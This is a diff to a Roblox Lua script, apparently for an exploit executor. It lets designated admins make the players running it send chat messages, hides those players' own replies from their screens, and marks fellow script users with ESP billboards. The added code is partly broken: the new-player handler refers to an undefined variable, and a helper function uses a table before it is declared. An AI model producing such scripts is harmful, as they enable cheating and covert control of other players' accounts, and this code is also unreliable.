@@ -36,6 +36,18 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
    String.Archivable = true
    String.Value = ""
 
+
+   ---Remove Name in Table Function
+   local function RemoveUser(name)
+    for key, value in pairs(UsersFound) do
+      if value == name then
+         UsersFound[key] = nil
+      end
+    end
+   end
+   ---
+
+
    ---Find Admin in List Table Function
    local function CheckAdmin(name)
     for key, value in pairs(Admins) do
@@ -87,6 +99,40 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
     end
    end
+   ---
+
+
+   ---Users Detector Operator
+   local UsersFound = {}
+   game:GetService("RunService").RenderStepped:Connect(function()
+   for i,v in pairs(game.Players:GetPlayers()) do
+     if v.Character:FindFirstChild("Head") and not v.Character.Head:FindFirstChild("USER ESP") then
+        for key, value in pairs(UsersFound) do
+          if value == v.Name then
+             local BillboardGui = Instance.new("BillboardGui")
+             local TextLabel = Instance.new("TextLabel")
+             local UICorner = Instance.new("UICorner") 
+ 
+             BillboardGui.Parent = v.Character:FindFirstChild("Head")
+             BillboardGui.Name = "USER ESP"
+             BillboardGui.AlwaysOnTop = false
+             BillboardGui.LightInfluence = 0
+             BillboardGui.Size = UDim2.new(0, 8, 0, 8)
+             BillboardGui.StudsOffset = Vector3.new(0, 1.5, 0)
+
+             TextLabel.Parent = BillboardGui
+             TextLabel.BackgroundColor3 = Color3.new(1,1,1)
+             TextLabel.BackgroundTransparency = 0
+             TextLabel.Size = UDim2.new(1, 0, 1, 0)
+             TextLabel.Text = ""
+
+             UICorner.Parent = TextLabel
+             UICorner.CornerRadius = UDim.new(1,0)
+          end
+        end
+     end
+   end
+   end)
    ---
 
 
@@ -170,10 +216,10 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
        admin_msg = admin_msg:sub(FindIndex(admin_msg, " ", 2), string.len(admin_msg))
        SendMessage(admin_msg)
     elseif admin_msg == ":" and MyName ~= admin.Name and MyName ~= Ghostplayer then
-       SendMessage("Im Here")
+       SendMessage("✅ Im Here ✅")
        wait(0.1)
        for i,v in pairs(game.CoreGui:GetDescendants()) do
-         if v.ClassName == "TextLabel" and string.find(v.Text, "Im Here") or v.ClassName == "TextButton" and string.find(v.Text, "Im Here") then
+         if v.ClassName == "TextLabel" and string.find(v.Text, "✅ Im Here ✅") or v.ClassName == "TextButton" and string.find(v.Text, "✅ Im Here ✅") then
             v.Parent:Destroy()
          end
        end
@@ -185,12 +231,24 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
    for _, v in pairs(game.Players:GetPlayers()) do 
      if v.Name == Ghostplayer or CheckAdmin(v.Name) == true then
         ExecuteAdminCMD(v)
+     else
+       v.Chatted:Connect(function(msg)
+       if msg == "✅ Im Here ✅" then
+          table.insert(UsersFound, v.Name)
+       end
+       end)
     end
    end
 
    game.Players.PlayerAdded:Connect(function(plr)
    if plr.Name == Ghostplayer or CheckAdmin(plr.Name) == true then
       ExecuteAdminCMD(plr)
+   else
+      v.Chatted:Connect(function(msg)
+      if msg == "✅ Im Here ✅" then
+         table.insert(UsersFound, v.Name)
+      end
+      end)
    end
    end)
 end
